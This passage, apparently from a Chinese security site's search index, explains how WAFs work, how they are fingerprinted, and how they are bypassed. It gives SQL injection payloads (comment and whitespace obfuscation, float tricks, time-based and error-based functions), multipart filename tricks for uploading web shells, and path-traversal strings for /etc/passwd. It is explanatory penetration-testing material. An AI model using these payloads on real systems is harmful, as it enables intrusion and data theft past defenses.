,( case when 1 = 1 then 1 else 0 x00end )) \u901a\u7528\u578b\u5224\u65adSQL\u8bed\u53e5","title":"1.\u6570\u636e\u5e93\u5c42\u9762\u57fa\u7840\u94fa\u57ab"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#2waf","text":"","title":"2.\u5c42\u5c42\u9012\u8fdb\u5206\u6790WAF\u6c42\u8bc1\u636e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#waf","text":"WAF\u7684\u53d1\u5c55\u4e3b\u8981\u7ecf\u5386\u4e86IPS\u67b6\u6784\uff0c \u53cd\u5411\u4ee3\u7406 \uff0c\u900f\u660e\u4ee3\u7406\u548c\u6d41\u6a21\u5f0f\u3002","title":"waf\u7684\u539f\u7406"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#waf_1","text":"WAF\u900f\u660e\u4ee3\u7406\u6280\u672f\u539f\u7406 waf\u901a\u4fe1 WAF\u4e3b\u8981\u4f1a\u66f4\u6539\u5982\u4e0b\u6570\u636e\u5305\u5185\u5bb9\u9879\uff1a \u5ba2\u6237\u7aefTCP\u6e90\u7aef\u53e3 \u5ba2\u6237\u7aef\u6e90MAC/\u670d\u52a1\u5668\u6e90MAC\u5730\u5740 \u957f\u77ed\u8fde\u63a5\u534f\u8bae\u7248\u672c MIME\u7c7b\u578b","title":"WAF\u5173\u952e\u6280\u672f"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#waf_2","text":"","title":"waf\u7684\u8bc6\u522b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#cookie","text":"Citrix Netscaler\uff082013\u5e74\u4f7f\u7528\u5e7f\u6cdb\uff09 Citrix Netscaler\u201d\u4f1a\u5728HTTP\u8fd4\u56de\u5934\u90e8Cookie\u4f4d\u7f6e\u52a0\u5165\u201cns_af\u201d\u7684\u503c\uff0c\u53ef\u4ee5\u4ee5\u6b64\u5224\u65ad\u4e3aCitrix Netscaler\u7684WAF\uff0c\u56fd\u5185\u6b64\u7c7bWAF\u5f88\u5c11 F5 BIG IP ASM F5 BiG IP ASM\u4f1a\u5728Cookie\u4e2d\u52a0\u5165\u201cTS+\u968f\u673a\u5b57\u7b26\u4e32\u201d\u7684Cookie\u4fe1\u606f\uff0c","title":"\u57fa\u4e8eCookie\u503c"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#http","text":"Mod_Security Mod_Security\u662f\u4e3aApache\u8bbe\u8ba1\u7684\u5f00\u6e90Web\u9632\u62a4\u6a21\u5757\uff0c\u4e00\u4e2a\u6076\u610f\u7684\u8bf7\u6c42Mod_Security\u4f1a\u5728\u54cd\u5e94\u5934\u8fd4\u56de\u201c406 Not acceptable\u201d WebKnight WebKnight\u662f\u7528\u6765\u8bbe\u8ba1\u5728IIS\u4e0b\u9762\u4f7f\u7528\u7684WAF\u8bbe\u5907\uff0c\u8f83\u4e3a\u5e38\u89c1\u3002WebKnight\u4f1a\u5bf9\u6076\u610f\u7684\u8bf7\u6c42\u8fd4\u56de\u201c999 No Hacking\u201d F5 BIG IP F5 BIG IP\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201c419 Unknown\u201d\u7684\u4fe1\u606f dotDefender dotDefender\u7528\u6765\u9632\u62a4.net\u7684\u7a0b\u5e8f\uff0c\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201cdotDefender Blocked Your Request\u201d","title":"\u57fa\u4e8eHTTP\u54cd\u5e94"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#_3","text":"\u90e8\u5206\u7279\u5b9aWAF\u5728\u8fd4\u56de\u7684\u544a\u8b66\u9875\u9762\u542b\u7279\u5b9a\u7684CSS\u6216\u8005JS\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u5224\u65ad\u7684\u4f9d\u636e\uff0c\u8fd9\u7c7b\u60c5\u51b5\u5728WAF\u7c7b\u91cc\u6bd4\u8f83\u5c11\uff0c\u53ef\u5f52\u5e76\u5230HTTP\u54cd\u5e94\u4e2d\u3002 Sqlmap\u4e2dWaf\u68c0\u6d4b\u65b9\u6cd5\uff0881\u79cd\uff0c\u5305\u62ec360\uff0c\u5b89\u5168\u72d7\uff0csafe3\uff0c\u4e91\u9501\uff09 sqlmap . py - u \u201c http : // www . xxx . com \u201d -- identify - waf -- batch","title":"\u7279\u5b9a\u8d44\u6e90\u6587\u4ef6"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#waf_3","text":"","title":"\u5168\u5c40\u8fc7waf\u7684\u51e0\u4e2a\u601d\u8003\u70b9"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#1-waf","text":"","title":"1. \u67b6\u6784\u5c42\u7ed5\u8fc7WAF"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#11","text":"\u4fe1\u606f\u6cc4\u9732\u53d1\u73b0\u6e90\u7ad9IP \u601d\u8def\u592a\u591a\uff0c\u90ae\u4ef6 \u7a77\u4e3eIP\u5730\u5740 \u5b8c\u6210\u4e00\u6b21\u56fd\u5185IP\u626b\u63cf\u53ea\u9700\u89818-9\u5c0f\u65f6","title":"1.1\u5bfb\u627e\u6e90\u7ad9"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#12","text":"\u4e91\u670d\u52a1\u5546\u4e70\u4e00\u53f0VPS\uff0c\u901a\u8fc7VPS\u653b\u51fb\u76ee\u6807\u7ad9\u70b9\uff0c\u56e0\u4e3a\u6d41\u91cf\u662f\u5c40\u57df\u7f51\uff0c\u53ef\u80fd\u4e0d\u7ecf\u8fc7WAF\u68c0\u6d4b\uff0c\u5b9e\u73b0\u7ed5\u8fc7","title":"1.2\u5229\u7528\u540c\u7f51\u6bb5"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#13","text":"\u5bfb\u627e\u5b50\u7ad9\u7684SSRF\u6f0f\u6d1e\u3002\u5982\u679c\u5b50\u7ad9\u8bbf\u95ee\u76ee\u6807\u7ad9\u4e0d\u7ecf\u8fc7WAF\u96c6\u7fa4\uff0c\u53ef\u4ee5\u5229\u7528SSRF\u6f0f\u6d1e\u6765\u7ed5\u8fc7WAF","title":"1.3\u5229\u7528\u8fb9\u754c\u6f0f\u6d1e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#2-waf","text":"WAF\u53ea\u68c0\u6d4b\u524d\u9762\u7684\u51e0K\u5b57\u8282\u30011M\u3001\u62162M\uff0c\u53ea\u9700\u8981\u5728POST BODY\u524d\u9762\u6dfb\u52a0\u8bb8\u591a\u65e0\u7528\u6570\u636e\uff0c\u628a\u653b\u51fbpayload\u653e\u5728\u6700\u540e\u5373\u53ef\u7ed5\u8fc7WAF\u68c0\u6d4b","title":"2. \u8d44\u6e90\u9650\u5236\u89d2\u5ea6\u7ed5\u8fc7WAF"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#3-waf","text":"","title":"3 \u534f\u8bae\u5c42\u9762\u7ed5\u8fc7WAF\u7684\u68c0\u6d4b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#31","text":"Waf\u672a\u80fd\u8986\u76d6Content-Type: multipart/form-data\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u6216\u8005WAF\u4f1a\u8ba4\u4e3a\u5b83\u662f\u6587\u4ef6\u4e0a\u4f20\u8bf7\u6c42\uff0c\u4ece\u800c\u53ea\u68c0\u6d4b\u6587\u4ef6\u4e0a\u4f20\uff0c\u5bfc\u81f4\u88ab\u7ed5\u8fc7","title":"3.1\u534f\u8bae\u8986\u76d6\u4e0d\u5168"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#32","text":"\u4f8b\u5982\u6587\u4ef6\u4e0a\u4f20\uff0c\u4e0a\u4f20\u6587\u4ef6\u540d\u7684\u4fee\u6539test.jpg/shell.php","title":"3.2\u534f\u8bae\u89e3\u6790\u4e0d\u6b63\u786e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#33web","text":"\u6587\u4ef6\u540d\u8986\u76d6 \u5728multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u5757\u5b58\u5728\u591a\u4e2aContent-Disposition\uff0c\u5c06\u4ee5\u6700\u540e\u4e00\u4e2aContent-Disposition\u7684filename\u503c\u4f5c\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u7b2c\u4e00\u4e2a\u6587\u4ef6\u540dshell.123 \u7b2c\u4e8c\u4e2ashell.php \u4e0a\u4f20\u540e\u662fshell.php Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\"\" Content-Disposition: form-data;name=\"myfile\"; filename=\"t3.jsp\" \u5728\u4e00\u4e2aContent-Disposition \u4e2d\uff0c\u5b58\u5728\u591a\u4e2afilename Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\";filename=\"t3.jsp\" \u9057\u6f0f\u6587\u4ef6\u540d \u5f53WAF\u9047\u5230\u201cname=\u201dmyfile\";;\u201d\u65f6\uff0c\u8ba4\u4e3a\u6ca1\u6709\u89e3\u6790\u5230filename\u3002\u800c\u540e\u7aef\u5bb9\u5668\u7ee7\u7eed\u89e3\u6790\u5230\u7684\u6587\u4ef6\u540d\u662ft3.jsp Content-Disposition: form-data;name=\"myfile\";; filename=\"t3.jsp\"\u3002 \u672a\u89e3\u6790\u6240\u6709\u6587\u4ef6 multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2aPOST\u8bf7\u6c42\u53ef\u4ee5\u540c\u65f6\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u3002\u5982\u56fe\uff0c\u8bb8\u591aWAF\u53ea\u68c0\u67e5\u7b2c\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ca1\u6709\u68c0\u67e5\u4e0a\u4f20\u7684\u6240\u6709\u6587\u4ef6\uff0c\u800c\u5b9e\u9645\u540e\u7aef\u5bb9\u5668\u4f1a\u89e3\u6790\u6240\u6709\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ea\u9700\u628apaylaod\u653e\u5728\u540e\u9762\u7684\u6587\u4ef6PART \u6587\u4ef6\u540d\u89e3\u6790\u517c\u5bb9\u6027 multipart\u534f\u8bae\u4e2d\uff0c\u6587\u4ef6\u540d\u7684\u5f62\u5f0f\u4e3a\u201cfilename=\"abc.php\"\u201d\u3002\u4f46\u662fTomcat\u3001PHP\u7b49\u5bb9\u5668\u89e3\u6790\u534f\u8bae\u65f6\u4f1a\u505a\u4e00\u4e9b\u517c\u5bb9\uff0c\u80fd\u6b63\u786e\u89e3\u6790 \u201dfilename=\"abc.php\u201d\u3001\u201dfilename=abc.php\u201d\u3001 \u201dfilename='abc.php\u2019\u201d\u3002\u800cWAF\u53ea\u6309\u7167\u534f\u8bae\u6807\u51c6\u53bb\u89e3\u6790\uff0c\u65e0\u6cd5\u89e3\u6790\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u540e\u7aef\u5bb9\u5668\u80fd\u6b63\u786e\u83b7\u5f97\u6587\u4ef6\u540d\uff0c\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u573a\u666f\u7684\u7ed5\u8fc7\u5f62\u5f0f\uff1a Content-Disposition: form-data; name=\"file\"; filename=abc.php Content-Disposition: form-data; name=\"file\"; filename=\"abc.php Content-Disposition: form-data; name=\"file\"; filename='abc.php\u2019 3.4\u53c2\u6570\u6c61\u67d3 \u8bf7\u6c42\u4e2d\u5305\u542b2\u4e2a\u53c2\u6570\u540d\u76f8\u540c\u7684\u53c2\u6570typeid\uff0c\u7b2c\u4e00\u4e2a\u662f\u6b63\u5e38\u53c2\u6570\u7684\u503c\u6b63\u5e38\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u624d\u662fpayload\u3002\u5982\u679cWAF\u89e3\u6790\u53c2\u6570\u4f7f\u7528\u7b2c\u4e00\u4e2a\u503c\uff0c\u6ca1\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u503c\uff0c\u5c06\u5bfc\u81f4\u7ed5\u8fc7\u3002\u8fd9\u662f\u5f88\u4e45\u5f88\u4e45\u7684\u4e00\u4e2aCASE\uff0c\u73b0\u5728\u51e0\u4e4e\u6ca1\u6709WAF\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\u3002 /forum.php\uff1f typeid=644&typeid=if(now()%3dsysdate()%2csleep(19.844)%2c0)/ 'XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR%22 /","title":"3.3\u534f\u8bae\u89e3\u6790\u4e0e\u540eWEB\u5bb9\u5668\u7684\u534f\u8bae\u89e3\u6790\u4e0d\u4e00\u81f4"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#4","text":"\u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u7ed5\u8fc7WAF\u89c4\u5219\u4e3b\u8981\u601d\u8003\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\u5728\u60f3\u4ec0\u4e48\uff0c\u5bb9\u6613\u5ffd\u7565\u4ec0\u4e48\uff0c\u63a8\u65ad\u4e00\u4e9b\u53ef\u80fd\u7ed5\u8fc7\u7684\u65b9\u5f0f\uff0c\u7136\u540e\u591a\u6b21\u5c1d\u8bd5\u8fdb\u884c\u9a8c\u8bc1\u3002\u96b6\u5c5e\u4e8e\u6f0f\u6d1e\u5c42\u9762\u8fc7waf","title":"4. \u89c4\u5219\u5c42\u9762\u7684\u7ed5\u8fc7"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#41-sql","text":"\u7ed5\u8fc7SQL\u6ce8\u5165\u89c4\u5219\u4e3b\u8981\u5229\u7528WAF\u89c4\u5219\u672c\u8eab\u7684\u95ee\u9898\u3001\u672a\u8003\u8651\u5230SQL\u8bed\u6cd5\u53d8\u5f62\u3001\u53ca\u540e\u7aef\u6570\u636e\u5e93SQL\u8bed\u53e5\u8bed\u6cd5\u7279\u6027 \u6ce8\u91ca\u7b26\u7ed5\u8fc7 / xxx /\u662f\u6ce8\u91ca\uff0c\u4e5f\u53ef\u4ee5\u5145\u5f53\u7a7a\u767d\u7b26\u3002\u56e0\u4e3a / /\u53ef\u4f7f\u5f97MySQL\u5bf9sql\u8bed\u53e5(union/ /select)\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u3002\u4e8b\u5b9e\u4e0a\u8bb8\u591aWAF\u90fd\u8003\u8651\u5230/**/\u53ef\u4ee5\u4f5c\u4e3a\u7a7a\u767d\u5206\uff0c\u4f46\u662fwaf\u68c0\u6d4b \u201c/*. */\u201d\u5f88\u6d88\u8017\u6027\u80fd\uff0c\u5de5\u7a0b\u5e08\u4f1a\u6298\u4e2d\uff0c\u53ef\u80fd\u5728\u68c0\u6d4b\u4e2d\u95f4\u5f15\u5165\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\uff0c\u4f8b\u5982\uff1a/ \\w+*/\u3002\u6216\u8005\uff0cWAF\u53ef\u80fd\u53ea\u4e2d\u95f4\u68c0\u67e5n\u4e2a\u5b57\u7b26\u201c/*.{,n}*/\u201d\u3002\u6839\u636e\u4ee5\u4e0a\u60f3\u6cd5\uff0c\u53ef\u4ee5\u9010\u6b65\u6d4b\u8bd5\u7ed5\u8fc7\u65b9\u6cd5\uff1a \u5148\u6d4b\u8bd5\u6700\u57fa\u672c\u7684\uff1aunion/**/select \u518d\u6d4b\u8bd5\u4e2d\u95f4\u5f15\u5165\u7279\u6b8a\u5b57\uff1aunion/ aaaa%01bbs /select \u6700\u540e\u6d4b\u8bd5\u6ce8\u91ca\u957f\u5ea6\uff1aunion/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /select \u540c\u7406\uff0c\u5bf9\u4e8e/ !xxx /\uff0c\u53ef\u4ee5\u91c7\u53d6\u7c7b\u4f3c\u7684\u601d\u8def\u7ed5\u8fc7WAF\u3002 \u7a7a\u767d\u7b26\u7ed5\u8fc7 \u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c SQL\u6ce8\u5165\u89c4\u5219\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u201c\\s\u201d\u5339\u914d\u7a7a\u683c\uff0c\u4f8b\u5982\u201dselect\\s+union\u201d\u3002\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7a7a\u767d\u7b26\u4e0eMySQL\u7a7a\u767d\u7b26\u7684\u4e0d\u540c\u53ef\u7ed5\u8fc7WAF\u89c4\u5219\u3002\u5982\u4f55\u8fd9\u4e9bMySQL\u7684\u7279\u6027\uff1f\u901a\u8fc7fuzz,\u6bcf\u6b21\u66f4\u6539\u6b63\u5e38SQL\u8bed\u53e5\u7684\u67d0\u90e8\u5206\uff0c\u66ff\u6362\u4e3a\u5176\u4ed6\u5b57\u7b26\uff0c\u5224\u65ad\u8bed\u6cd5\u662f\u5426\u6b63\u786e\uff0c\u5373\u53ef\u5224\u65ad\u51fa\u6765MySQL\u8bed\u6cd5\u7279\u6027\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5206\u6790MySQL\u8bcd\u6cd5\u6765\u53d1\u73b0\u8bed\u6cd5\u7279\u6027\uff0c\u4ece\u800c\u627e\u5230\u7ed5\u8fc7\u65b9\u6cd5\u3002 \u5229\u7528\u7a7a\u767d\u7b26\u8fdb\u884c\u7ed5\u8fc7\uff0c\u6d4b\u8bd5WAF\u65f6\u5c3d\u53ef\u80fd\u51cf\u5c11\u5176\u4ed6\u539f\u56e0\u7684\u5f71\u54cd\uff0c\u4f8b\u5982\u201dunion select\u201d\u88ab\u62e6\u622a\uff0c\u53ea\u9700\u628a\u4e2d\u95f4\u7a7a\u767d\u7b26\u66ff\u6362\u4e3a\u201d%250C\u201d, \u201c%25A0\u201d\u8fdb\u884c\u7ed5\u8fc7\u6d4b\u8bd5\u3002 union%250Cselect union%25A0select \u51fd\u6570\u5206\u9694\u7b26 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u6211\u4eec\u731c\u6d4b\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\uff0c\u53ef\u80fd\u4e0d\u77e5\u9053\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\uff0c\u6216\u8005\u9057\u6f0f\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\u3002\u4f8b\u5982\u5339\u914d\u51fd\u6570\u201dconcat()\u201d\u7684\u89c4\u5219\u5199\u6cd5\uff0c\u201cconcat(\u201d\u6216\u8005\u201dconcat\\s*(\u201d\uff0c\u5c31\u6ca1\u6709\u8003\u8651\u5230\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u3002\u76f8\u5e94\u7684\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u5728\u7279\u6b8a\u4f4d\u7f6e\u5f15\u5165\u7279\u6b8a\u7684\u5206\u9694\u7b26\uff0c\u9010\u4e2a\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u7279\u6b8a\u5206\u9694\u7b26\u53d1\u73b0\u4e5f\u662f\u901a\u8fc7Fuzz\u51fa\u6765\u7684\u3002 concat%2520( concat/**/( concat%250c( concat%25a0( \u4e3e\u4e00\u53cd\u4e09\uff0c\u5bfb\u627e\u7c7b\u4f3c\u7684\u5173\u952e\u4f4d\u7f6e\uff0cFuzz\u7279\u6b8a\u5b57\u7b26\uff0c\u53d1\u73b0\u66f4\u591a\u7684\u7ed5\u8fc7\u65b0\u65b9\u6cd5\u3002\u731c\u6d4b\u5de5\u7a0b\u5e08\u4eec\u5199\u89c4\u5219\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u5bb9\u6613\u9057\u6f0f\u7684\u70b9\uff0c\u8fdb\u884c\u7ed5\u8fc7WAF\u68c0\u6d4b\u3002 \u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790 \u5229\u7528MySQL\u89e3\u6790\u6d6e\u70b9\u6570\u7684\u7279\u70b9\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u65e0\u6cd5\u5339\u914d\u51fa\u5355\u8bcdunion\uff0c\u4f46\u662fMySQL\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u89e3\u6790\u51fa\u6d6e\u70b9\u6570\u3001sql\u5173\u952e\u5b57union\u3002 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\\Nunion select 1,2,3,4,5,6,7,8,9,0 \u5229\u7528error-based\u8fdb\u884cSQL\u6ce8\u5165 Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u975e\u5e38\u5bb9\u6613\u88ab\u5ffd\u7565\uff0c\u5bfc\u81f4WAF\u89c4\u5219\u8fc7\u6ee4\u4e0d\u5b8c\u6574\u3002\u968f\u7740\u5bf9MySQL\u7814\u7a76\u8d8a\u6765\u8d8a\u6df1\uff0c\u88ab\u53d1\u73b0\u53ef\u7528\u4e8eerror-based SQL\u6ce8\u5165\u7684\u51fd\u6570\u8d8a\u6765\u8d8a\u591a\uff0c\u540c\u65f6\u4e5f\u7ed9\u7ed5\u8fc7WAF\u9020\u5c31\u4e86\u66f4\u591a\u673a\u4f1a\u3002\u5e38\u89c1\u7684\u51fd\u6570\uff1a extractvalue(1, concat(0x5c,md5(3))); updatexml(1, concat(0x5d,md5(3)),1); GeometryCollection((select*from(select*from(select@@version)f)x)) polygon((select*from(select name_const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() \u5229\u7528Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u8fdb\u884c\u7ed5\u8fc7\u65f6\uff0c\u53ef\u4ee5\u7ed3\u5408\u51fd\u6570\u5206\u9694\u7b26\uff0c\u6216\u5176\u4ed6\u65b9\u6cd5\u7075\u6d3b\u8fd0\u7528\u3002 Mysql\u7279\u6b8a\u8bed\u6cd5 \u6700\u6709\u6548\u7684\u53d1\u73b0\u624b\u6bb5\uff0c\u8fd8\u662f\u53bb\u8bfb\u8bfbMySQL\u8bcd\u6cd5\u5206\u6790\u6e90\u4ee3\u7801\u3002\u548c\u534f\u8bae\u7ed5\u8fc7\u7c7b\u4f3c\uff0c\u6316\u6398SQL\u6807\u51c6\u4e0eMySQL\u7684\u8bcd\u6cd5\u5206\u6790\u5dee\u5f02\u662f\u53d1\u73b0WAF SQL\u6ce8\u5165\u7ed5\u8fc7\u7684\u6709\u6548\u624b\u6bb5\u3002\u4ee5\u4e0b\u662fMySQL\u8bed\u6cd5\u7684\u4e00\u4e2a\u7279\u5199(ps:\u4e0d\u662f\u6211\u53d1\u73b0\u7684)\uff1a select{x table_name}from{x information_schema.tables}; \u7efc\u5408\u5229\u7528\u5b9e\u4f8b \u4ee5\u4e0a\u90fd\u662fSQL\u6ce8\u5165\u7ed5\u8fc7\u4e2d\u7684\u6280\u672f\u70b9\uff0c\u5728\u5b9e\u9645\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u9700\u8981\u7075\u6d3b\u7efc\u5408\u5229\u7528\u624d\u80fd\u8fbe\u5230\u5b8c\u6574\u7ed5\u8fc7\uff0c\u8bfb\u53d6\u6570\u636e\u6570\u636e\u3002\u4ee5\u4e0b\u7ed9\u51fa\u5b8c\u6574\u7ed5\u8fc7WAF SQ\u6ce8\u5165\u68c0\u6d4b\u7684\u5b9e\u4f8b\u3002\u5982\u56fe\uff0c\u672c\u4f8b\u4e2d\u7efc\u5408\u591a\u4e2a\u7ed5\u8fc7\u6280\u672f\u70b9\uff0c\u6700\u7ec8\u5b9e\u73b0\u5b8c\u6574\u7ed5\u8fc7\u5b9e\u73b0\u8bfb\u53d6\u6570\u636e\u3002 \u5229\u7528\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7union select \u7684\u68c0\u6d4b\u3002 \u540c\u6837\uff0c\u51fd\u6570\u5206\u9694\u7b26\u601d\u60f3\u96c6\u548c\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7\u5173\u952e\u5b57from\u7684\u68c0\u6d4b\u3002 \u6700\u540e\u7a7a\u767d\u5206\u5206\u5272\u7ed5\u8fc7INFORMATION_SCHEMA.TABLES\u7684\u68c0\u67e5","title":"4.1. SQL\u6ce8\u5165\u7ed5\u8fc7"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#42","text":"\u6587\u4ef6\u5305\u542b\u5206\u4e3a\u76f8\u5bf9\u8def\u5f84\u3001\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u3002\u5728\u76f8\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u4e2d\uff0c\u6700\u7ec8\u6839\u636eLinux\u865a\u62df\u6587\u4ef6\u7cfb\u7edf(vfs)\u7684\u89c4\u5219\u67e5\u627e\u6587\u4ef6\uff0c\u901a\u8fc7\u5206\u6790vfs\u7684\u6587\u4ef6\u8def\u5f84\u89e3\u6790\u89c4\u5219\uff0c\u63d0\u53d6\u5176\u4e2d\u89c4\u5219\u7279\u70b9\uff0c\u7528\u8fd9\u4e9b\u7279\u70b9\u53bb\u7ed5\u8fc7WAF\u3002\u5728\u7edd\u5bf9\u6587\u4ef6\u8def\u5f84\u5305\u542b\u4e2d\uff0c\u4e3b\u8981\u662f\u6839\u636e\u653b\u51fb\u573a\u666f\uff0cWAF\u672a\u8fc7\u6ee4\u4e00\u4e9b\u534f\u8bae\u3001\u672a\u8fc7\u6ee4\u67d0\u4e9b\u7279\u6b8a\u8def\u5f84\u3002 \u76f8\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 \u5199WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u65f6\uff0c\u5982\u679c\u68c0\u6d4b\u5355\u4e00\u7684\u201d../\u201d\uff0c\u8bef\u62a5\u4f1a\u975e\u5e38\u591a\uff0c\u6240\u4ee5WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u901a\u5e38\u4f1a\u68c0\u6d4b\u8fde\u7eed\u7684\u201c../\"\u3002\u6839\u636evfs\u89e3\u6790\u8def\u5f84\u7684\u8bed\u6cd5\uff0c\u89e3\u6790\u5230\u201c//\u201d\u6587\u4ef6\u8def\u5f84\u4e0d\u53d8\uff0c\u89e3\u6790\u5230\u201c/./\u201d\u6587\u4ef6\u8def\u5f84\u4f9d\u7136\u3002 \u901a\u8fc7\u907f\u514d\u8fde\u7eed\u7684\"../\"\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u3002Eg: ././..///./.././/../etc//passwd\uff0c\u5b83\u7b49\u4ef7\u4e8e../../../etc/passwd \u7edd\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 WAF\u6ca1\u6709\u8003\u8651\u5230\u8def\u5f84\u4e2d\u63d2\u5165\u201c/./\u201d\u3001\u201c//\u201d\u5bf9\u4e8evfs\u89e3\u6790\u8def\u5f84\u662f\u7b49\u4ef7\u7684\uff0c\u5bfc\u81f4\u53ef\u88ab\u7ed5\u8fc7\u3002\u4f8b\u5982 /etc/./passwd \u4e0e /etc/passwd \u662f\u7b49\u4ef7\u7684\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7ec4\u5408\u201c/./\u201d\u3001\u201c//\u201d\u8fdb\u884c\u7ed5\u8fc7\uff0ceg. /etc///.//././/passwd\u3002 